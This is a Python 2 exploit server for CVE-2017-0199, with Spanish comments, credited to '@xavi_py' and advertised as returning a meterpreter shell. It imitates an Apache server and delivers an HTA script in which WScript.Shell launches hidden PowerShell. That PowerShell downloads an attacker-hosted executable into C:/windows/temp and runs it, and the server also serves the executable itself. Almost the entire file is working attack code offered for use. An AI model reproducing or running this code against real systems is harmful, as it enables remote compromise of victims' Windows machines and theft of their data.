#!/usr/bin/python2
# -*- coding: utf-8 -*-
#c0ded by @xavi_py
#r3turns meterpreter shell

import os,sys,thread,socket
import subprocess,base64,argparse,urllib,time


print """
 ▄  █    ▄▄▄▄▀ ██     ▄▄▄▄▀ ▄▄▄▄▀ ██   ▄█▄    █  █▀ 
█   █ ▀▀▀ █    █ █ ▀▀▀ █ ▀▀▀ █    █ █  █▀ ▀▄  █▄█   
██▀▀█     █    █▄▄█    █     █    █▄▄█ █   ▀  █▀▄   
█   █    █     █  █   █     █     █  █ █▄  ▄▀ █  █  
   █    ▀         █  ▀     ▀         █ ▀███▀    █   
  ▀              █                  █          ▀    
                ▀                  ▀
                                        (CVE-2017-0199)
                   @xavi_py
"""

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', dest='url', help='Url del payload (Ej. http://192.168.1.1/shell.exe)', metavar='PAYLOAD')
parser.add_argument('-p', '--port', dest='lport', help='Puerto (Default: 80)', metavar='PUERTO', default=80)

def main():

	if not len(sys.argv[1:]):
		parser.print_help()
	else:
		args = parser.parse_args()
		port = args.lport
		global url
		url = args.url
		print('[*] Servidor activo y escuchando peticiones')
		print('[*] El payload se aloja en ' + url)
 
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind(('', port))
		s.listen(50)

	except socket.error, (value, message):
		if s:
        		s.close()
			print "[ERROR] No se pudo abrir un socket. Razón:", message
        		sys.exit(1)
 
	while 1:
		conn, client_addr = s.accept()
		thread.start_new_thread(server_thread, (conn, client_addr))

        s.close()

def server_thread(conn, client_addr):
 
    request = conn.recv(999999)
    if (len(request) > 0):

        cliente = request.split('\n')[0]
        metodo = cliente.split(' ')[0]
        direccion = cliente.split(' ')[1]
        peticionpayload = direccion.find('.exe')

        if (peticionpayload > 0):
        	print('[*] Recibiendo petición de descarga del payload ' + client_addr[0])
        	size = os.path.getsize('/var/www/html/' + url.rsplit('/', 1)[-1])
        	data = "HTTP/1.1 200 OK\r\nDate: " + time.strftime("%a, %d %b %Y %X") + " GMT" "\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Wed, 19 Apr 2017 21:13:37 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: "+str(size)+"\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/x-msdos-program\r\n\r\n"
         	with open('/var/www/html/' + url.rsplit('/', 1)[-1]) as fin:
         		data += fin.read()
                	conn.send(data)
                	conn.close()
                	sys.exit(1)

        if metodo in ['GET', 'get']:
            	print('[*] Recibiendo petición GET de ' + client_addr[0])
            	data = "HTTP/1.1 200 OK\r\nDate: " + time.strftime("%a, %d %b %Y %X") + " GMT" + "\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Wed, 19 Apr 2017 21:13:37 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 315\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/hta\r\n\r\n<script>\na=new ActiveXObject(\"WScript.Shell\");\na.run('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\\'" + url + "\\', \\'C:/windows/temp/shell.exe\\'); C:/windows/temp/shell.exe', 0);window.close();\n</script>\r\n"
            	conn.send(data)
            	conn.close()

        if metodo in ['OPTIONS', 'options']:
            	print('[*] Recibiendo petición OPTIONS de ' + client_addr[0])
            	data = "HTTP/1.1 200 OK\r\nDate: " + time.strftime("%a, %d %b %Y %X") + " GMT" + "\r\nServer: Apache/2.4.25 (Debian)\r\nAllow: OPTIONS,HEAD,GET\r\nContent-Length: 0\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/html"
            	conn.send(data)
            	conn.close()

        if metodo in ['HEAD', 'head']:
           	print('[*] Recibiendo petición HEAD de ' + client_addr[0])
            	data = "HTTP/1.1 200 OK\r\nDate: " + time.strftime("%a, %d %b %Y %X") + " GMT" + "\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Wed, 19 Apr 2017 21:13:37 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 315\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/doc\r\n\r\n"
            	conn.send(data)
            	conn.close()

        sys.exit(1)

if __name__ == '__main__':
    main()
